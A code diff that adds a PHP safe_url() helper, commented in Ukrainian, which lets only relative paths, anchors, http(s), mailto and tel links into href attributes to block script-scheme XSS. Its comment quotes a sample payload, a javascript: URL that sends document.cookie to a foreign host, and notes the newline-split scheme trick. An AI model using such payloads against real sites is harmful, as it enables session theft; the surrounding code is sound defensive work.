@@ -135,6 +135,42 @@ function safe_back($path, string $fallback = '/'): string {
     return $path;
 }
 
+/**
+ * Адреса, яку не страшно поставити в href.
+ *
+ * `e()` рятує від виходу з атрибута, але не від схеми: рядок
+ * `javascript:fetch('//чуже'+document.cookie)` проходить екранування цілим і
+ * спрацьовує від кліку. У href потрапляють значення, які вписують люди —
+ * посилання на курс, соцмережі, сайт партнера, — а ще QR-адреса чека, яку
+ * повертає ПРРО, тобто взагалі чужа система.
+ *
+ * Дозволяємо рівно те, що буває справжнім посиланням: свій відносний шлях,
+ * http(s), пошту й телефон. Усе інше стає '#' — краще мертве посилання, ніж
+ * живий скрипт.
+ *
+ * Пробіли, переноси й керівні символи ріжемо до перевірки: `java\nscript:` для
+ * браузера це та сама схема, а для наївного порівняння — вже ні.
+ */
+function safe_url($url, string $fallback = '#'): string {
+    $u = trim((string)($url ?? ''));
+    if ($u === '') return $fallback;
+    // \x00-\x20 разом із «м'якими» пробілами, якими розривають назву схеми
+    $probe = strtolower(preg_replace('~[\x00-\x20\x7F\p{Zs}\x{200B}-\x{200D}\x{FEFF}]+~u', '', $u) ?? $u);
+
+    // Свій шлях: починається зі скісної, але не з '//' — це вже чужий домен
+    if (str_starts_with($u, '/') && !str_starts_with($u, '//')) return $u;
+    // Якір і запит на цій же сторінці
+    if ($u[0] === '#' || $u[0] === '?') return $u;
+
+    foreach (['http://', 'https://', 'mailto:', 'tel:'] as $ok) {
+        if (str_starts_with($probe, $ok)) return $u;
+    }
+    // Схеми немає взагалі («bofu.ua/shop») — дописуємо https, як це зробила б людина
+    if (!str_contains($probe, ':') && preg_match('~^[a-z0-9]~i', $u)) return 'https://' . $u;
+
+    return $fallback;
+}
+
 function redirect(string $path): never {
     header('Location: ' . (preg_match('~^https?://~', $path) ? $path : base_url($path)));
     exit;
